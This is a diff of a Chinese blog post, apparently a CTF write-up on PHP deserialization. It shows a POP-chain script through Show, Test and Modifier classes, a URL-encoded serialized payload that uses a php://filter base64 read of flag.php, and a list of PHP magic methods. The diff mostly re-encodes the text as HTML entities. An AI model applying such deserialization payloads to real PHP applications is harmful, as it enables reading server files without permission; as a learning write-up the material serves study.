+    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;//&#x8FD9;&#x662F;&#x7279;&#x6B8A;&#x7684; PHP &#x8FC7;&#x6EE4;&#x5668;&#xFF0C;&#x5B83;&#x5C06;&#x8BFB;&#x53D6;&#x6587;&#x4EF6; &#x201C;flag.php&#x201D; &#x7684;&#x5185;&#x5BB9;&#x5E76;&#x4EE5; Base64 &#x7F16;&#x7801;&#x7684;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;&#x3002;
+}
  
-class Show &#123;
+class Show {
     public $source;
     public $str;
-    public function __toString()&#123;
+    public function __toString(){
         return $this-&gt;str-&gt;source;
-    &#125;
-&#125;
+    }
+}
  
-class Test&#123;
+class Test{
     public $p;
-&#125;
+}
  
 $a= new Show();
-$a-&gt;source = new Show();//触发tostring
-$a-&gt;source-&gt;str=new Test();//触发test类的get
-$a-&gt;source-&gt;str-&gt;p=new Modifier();//_get触发后让p为Modifier对象,以触发触发_invoke（）
-echo urlencode(serialize($a));//反序列化b，此时触发wakeup，完成链的利用
+$a-&gt;source = new Show();//&#x89E6;&#x53D1;tostring
+$a-&gt;source-&gt;str=new Test();//&#x89E6;&#x53D1;test&#x7C7B;&#x7684;get
+$a-&gt;source-&gt;str-&gt;p=new Modifier();//_get&#x89E6;&#x53D1;&#x540E;&#x8BA9;p&#x4E3A;Modifier&#x5BF9;&#x8C61;,&#x4EE5;&#x89E6;&#x53D1;&#x89E6;&#x53D1;_invoke&#xFF08;&#xFF09;
+echo urlencode(serialize($a));//&#x53CD;&#x5E8F;&#x5217;&#x5316;b&#xFF0C;&#x6B64;&#x65F6;&#x89E6;&#x53D1;wakeup&#xFF0C;&#x5B8C;&#x6210;&#x94FE;&#x7684;&#x5229;&#x7528;
 ?&gt;
 </code></pre>
 <p>payload:O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p>
-<p>把得到的内容base64一下即可</p>
-<p>常见魔术方法总结</p>
-<pre><code>__construct(): 在创建对象时自动调用。
+<p>&#x628A;&#x5F97;&#x5230;&#x7684;&#x5185;&#x5BB9;base64&#x4E00;&#x4E0B;&#x5373;&#x53EF;</p>
+<p>&#x5E38;&#x89C1;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x603B;&#x7ED3;</p>
+<pre><code>__construct(): &#x5728;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__destruct(): 在销毁对象时自动调用。
+__destruct(): &#x5728;&#x9500;&#x6BC1;&#x5BF9;&#x8C61;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__call(): 当调用一个不存在的方法时自动调用。
+__call(): &#x5F53;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__callStatic(): 当调用一个不存在的静态方法时自动调用。
+__callStatic(): &#x5F53;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__get(): 当读取一个不存在的属性时自动调用。
+__get(): &#x5F53;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__set(): 当设置一个不存在的属性时自动调用。
+__set(): &#x5F53;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__isset(): 在使用isset()或empty()函数判断一个不存在的属性时自动调用。
+__isset(): &#x5728;&#x4F7F;&#x7528;isset()&#x6216;empty()&#x51FD;&#x6570;&#x5224;&#x65AD;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__unset(): 在使用unset()函数删除一个不存在的属性时自动调用。
+__unset(): &#x5728;&#x4F7F;&#x7528;unset()&#x51FD;&#x6570;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__sleep(): 在进行序列化操作时自动调用，在返回值中可以指定需要序列化的属性。
+__sleep(): &#x5728;&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#xFF0C;&#x5728;&#x8FD4;&#x56DE;&#x503C;&#x4E2D;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5C5E;&#x6027;&#x3002;
  
-__wakeup(): 在反序列化操作时自动调用。
+__wakeup(): &#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x3002;
  
-__toString(): 在一个对象被当作一个字符串时自动调用，例如echo $obj。
+__toString(): &#x5728;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x4F5C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#xFF0C;&#x4F8B;&#x5982;echo $obj&#x3002;
  
-__invoke(): 当一个对象被当作一个函数时自动调用，例如$obj()。
+__invoke(): &#x5F53;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x5F53;&#x4F5C;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x65F6;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#xFF0C;&#x4F8B;&#x5982;$obj()&#x3002;
 </code></pre>
 </article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">muruoze1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/">http://example.com/2024/07/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">muruoze1的小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="../%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%9524-7-10/" title="学习记录24-7-10"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">学习记录24-7-10</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='../../../../img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">muruoze1</div><div class="author-info__description">于无所希望中得救</div></div><div class="card-info-data site-data is-center"><a href="../../../../archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="../../../../tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="../../../../categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="" title="学习记录24-7-10">学习记录24-7-10</a><time datetime="2024-07-10T11:15:42.000Z" title="发表于 2024-07-10 19:15:42">2024-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/" title="反序列化">反序列化</a><time datetime="2024-07-10T11:13:11.000Z" title="发表于 2024-07-10 19:13:11">2024-07-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By muruoze1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="../../../../js/utils.js?v=4.13.0"></script><script src="../../../../js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
